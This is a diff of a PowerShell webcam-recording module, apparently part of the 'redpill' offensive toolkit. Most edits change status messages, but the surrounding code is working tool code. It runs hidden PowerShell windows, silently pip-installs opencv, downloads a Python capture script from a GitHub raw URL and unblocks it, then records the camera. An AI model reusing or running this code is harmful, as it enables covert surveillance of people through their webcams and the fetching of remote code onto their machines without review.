@@ -87,15 +87,24 @@ $ErrorActionPreference = "SilentlyContinue"
 $host.UI.RawUI.WindowTitle = "@Invoke-WebCamAvi $cmdletver"
 write-host "`n* " -ForegroundColor Green -NoNewline
 write-host "Recording webcam live in avi format." -ForegroundColor Green
+
+
+#Make sure working directory exists
+If(-not(Test-Path -Path "$WorkingDir"))
+{
+   write-host "x " -ForegroundColor Red -NoNewline
+   write-host "NotFound: " -ForegroundColor DarkGray -NoNewline
+   write-host "$WorkingDir`n" -ForegroundColor Red
+   return
+}
+
+#Check if Python its installed { mandatory dependencie }
 Start-Process -WindowStyle Hidden powershell -ArgumentList "[bool](python -V) > $WorkingDir\pyver.log" -Wait
-
-
-#Check if Python3 its installed
 $pythonTest = Get-Content -Path "$WorkingDir\pyver.log"
 If(-not(Test-Path -Path "$WorkingDir\pyver.log") -or ($pythonTest -iNotMatch 'True') -or ($pythonTest -eq $null))
 {
    write-host "x " -ForegroundColor Red -NoNewline
-   write-host "Error: " -ForegroundColor DarkGray -NoNewline
+   write-host "FailDependencie: " -ForegroundColor DarkGray -NoNewline
    write-host "Module requires python installed.`n" -ForegroundColor Red
    return
 }
@@ -105,8 +114,8 @@ Start-Process -WindowStyle Hidden powershell -ArgumentList "[bool](pip list|find
 If(-not(Test-Path -Path "$WorkingDir\opencv.log") -and ($Force -ieq "false"))
 {
    write-host "x " -ForegroundColor Red -NoNewline
-   write-host "Error: " -ForegroundColor DarkGray -NoNewline
-   write-host "module failed to create opencv.log`n" -ForegroundColor Red
+   write-host "FailToCreate: " -ForegroundColor DarkGray -NoNewline
+   write-host "$WorkingDir\opencv.log`n" -ForegroundColor Red
    return
 }
 
@@ -115,13 +124,13 @@ If($Force -ieq "false")
    $OPenCVTest = Get-Content -Path "$WorkingDir\opencv.log"
    If(-not($OPenCVTest) -or ($OPenCVTest -iNotMatch 'True'))
    {
-      write-host "x " -ForegroundColor Red -NoNewline
-      write-host "Error: " -ForegroundColor DarkGray -NoNewline
+      write-host "  x " -ForegroundColor Red -NoNewline
+      write-host "FailDependencie: " -ForegroundColor DarkGray -NoNewline
       write-host "Module requires opencv-python installed." -ForegroundColor Red
       Start-Sleep -Seconds 2
 
-      write-host "  => " -ForegroundColor Yellow -NoNewline
-      write-host "Installing:'" -ForegroundColor DarkGray -NoNewline
+      write-host "  + " -ForegroundColor Yellow -NoNewline
+      write-host "Auto-Installing:'" -ForegroundColor DarkGray -NoNewline
       write-host "pip install opencv-python" -ForegroundColor Green -NoNewline
       write-host "'`n" -ForegroundColor DarkGray
       echo y|pip install opencv-python --exists-action ignore #Auto-Install dependencies
@@ -141,7 +150,7 @@ If($Force -ieq "false")
    {
       write-host "  x " -ForegroundColor Red -NoNewline
       write-host "NotOptimal: " -ForegroundColor DarkGray -NoNewline
-      write-host "record time, defaulting to 10 sec." -ForegroundColor Yellow
+      write-host "record time, default to 10 sec." -ForegroundColor Yellow
       [int]$RecTime = '10'
    }
 }
@@ -153,7 +162,7 @@ write-host "Downloading python script from github."
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "$WorkingDir\WebCam.py"|Unblock-File
 
 
-#Config python script
+#Config WebCam.py python script
 $ReplaceMe = Get-Content -Path "$WorkingDir\WebCam.py"
 $RegInstallPath = Python -c "import os, sys; print(os.path.dirname(sys.executable))"
 If(-not($RegInstallPath) -or ($RegInstallPath -eq $null))
@@ -165,7 +174,7 @@ If(-not($RegInstallPath) -or ($RegInstallPath -eq $null))
 
    $RegInstallPath = "$Env:LOCALAPPDATA\Programs\python"
    write-host "  + " -ForegroundColor Yellow -NoNewline
-   write-host "Use-path: " -ForegroundColor DarkGray -NoNewline
+   write-host "Use-Path: " -ForegroundColor DarkGray -NoNewline
    write-host "$Env:LOCALAPPDATA\Programs\python" -ForegroundColor Green
 }
 
@@ -264,7 +273,7 @@ If($AutoView -ieq "true")
 {
    #Auto-Start video file
    write-host "* " -ForegroundColor Green -NoNewline
-   write-host " [action] Auto-Start of ${FileName} video file."
+   write-host "[action] Auto-Start of ${FileName} video file."
    Start-Process "${WorkingDir}\${FileName}"
 }
 
